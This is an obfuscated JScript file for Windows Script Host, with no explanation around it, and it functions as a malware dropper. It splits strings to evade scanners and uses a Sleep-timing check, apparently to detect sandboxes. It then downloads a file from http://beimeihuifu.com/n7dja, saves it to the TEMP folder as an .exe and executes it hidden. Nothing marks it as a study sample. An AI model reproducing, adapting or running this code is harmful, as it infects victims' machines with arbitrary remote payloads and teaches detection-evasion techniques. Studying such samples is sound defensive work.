var HG = false;
var N = "Create"+"Object";
var V = function UZ() {return WScript[N]("WScript"+".Shell");}(), ME = 11;
var X = "MSXML2"+".XMLHTTP";
var B = 2;
var TK = B - 2;
function NY(DM){V["Run"](DM, TK, TK);};
function WO(){return X + "";};
function KT(DL, HX){TK = TK * 1; return DL - HX;};
function KQ(){return N;};
/*@cc_on
  @if (@_win32 || @_win64)
    HG = true;
  @end
@*/
if (HG)
{
var J = "";
function JW(){return 22;};
var NV = 0; var G = 0;
function MZ()
{
var CM = new this["Date"]();
var T = CM["getUTCMilliseconds"]();
WScript["Sleep"](JW());
var CM = new this["Date"]();
var S = CM["getUTCMilliseconds"]();
WScript["Sleep"](JW());
var CM = new this["Date"]();
var UA = CM["getUTCMilliseconds"]();
var NV = "P";
NV = KT(S, T);
var G = "AJ";
G = KT(UA, S);
J = "open";
return KT(NV, G);
}
var W0 = false;
var C0 = false;
for (var DY = TK; DY < JW() * 1; DY++){if (MZ() != TK){
W0 = true; 
G = "31" + 11 * NV + G; 
C0 = true; 
break;
}}
function R() {return ((W0 == true) && (W0 == C0)) ? 1 : TK;};
if (W0 && R() && C0){
function YC() {return V["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "VL15F6Mc.ex" + "e";};
 DH = WO();
 PJ = WScript[N](DH);
 var U = 1;
do { 
	for (;U;){
	try {
		if (U == 1)
		{
			PJ[J]("GET", "http://beimeihuifu.com/n7dja", false);
			PJ["send"]();
			VN = "Sleep";
			U = 2;
		}
		WScript[VN](JW() + 120); 
		if (PJ["readystate"] < 2 * 2) continue;
		U = TK;
		function C(AP) {var W = (1, 2, 3, 4, 5, AP); return W;};
		P0 = WScript[KQ()]("ADODB.Stream");
		DH = P0;
		DH[J]();
		DH["type"] = C(1);
		DH["write"](PJ["ResponseBody"]);
		P0["position"] = C(TK);
		DH["Save" + "ToFile"](YC(), 2);
		P0["cl"+"ose"]();
		KS = YC();
		NY(KS);
	} catch(K){};};
}while (U);
}
}

